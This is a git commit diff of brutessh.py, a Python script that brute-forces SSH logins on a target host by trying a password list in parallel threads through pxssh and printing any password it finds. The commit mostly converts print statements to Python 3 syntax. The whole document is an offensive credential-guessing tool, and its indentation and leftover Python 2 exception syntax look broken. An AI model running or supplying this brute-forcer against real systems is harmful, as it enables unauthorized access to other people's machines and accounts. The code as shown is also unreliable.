bbc15c94049f903e328334fec522773a7681acde
m <marcamesser@gmail.com>
2019-08-08 13:14:12 -0400

    Update brutessh.py

--- brutessh.py
+++ brutessh.py
@@ -1,20 +1,25 @@
 #!/usr/bin/python
 
+
 import pxssh
 import optparse
 import time
 from threading import *
+
+
 maxConnections = 5
 connection_lock = BoundedSemaphore(value=maxConnections)
 Found = False
 Fails = 0
+
+
 def connect(host, user, password, release):
 	global Found
 	global Fails
 	try:
 		s = pxssh.pxssh()
 		s.login(host, user, password)
-		print '[+] Password Found: ' + password
+		print("[+] Password Found: " + password)
     Found = True
     except Exception, e:
     	if 'read_nonblocking' in str(e):
@@ -26,6 +31,8 @@ def connect(host, user, password, release):
         	connect(host, user, password, False)
         finally:
         	if release: connection_lock.release()
+			
+			
 def main():
 	parser = optparse.OptionParser('usage%prog '+\
 		'-H <target host> -u <user> -F <password list>')
@@ -45,14 +52,14 @@ def main():
 	fn = open(passwdFile, 'r')
 	for line in fn.readlines():
 		if Found:
-			print "[*] Exiting: Password Found"
+			print("[*] Exiting: Password Found")
 			exit(0)
 		if Fails > 5:
-			print "[!] Exiting: Too Many Socket Timeouts"
+			print("[!] Exiting: Too Many Socket Timeouts")
 			exit(0)
 		connection_lock.acquire()
 		password = line.strip('\r').strip('\n')
-		print "[-] Testing: "+str(password)
+		print("[-] Testing: "+str(password))
 		t = Thread(target=connect, args=(host, user, \
 			password, True))
 		child = t.start()
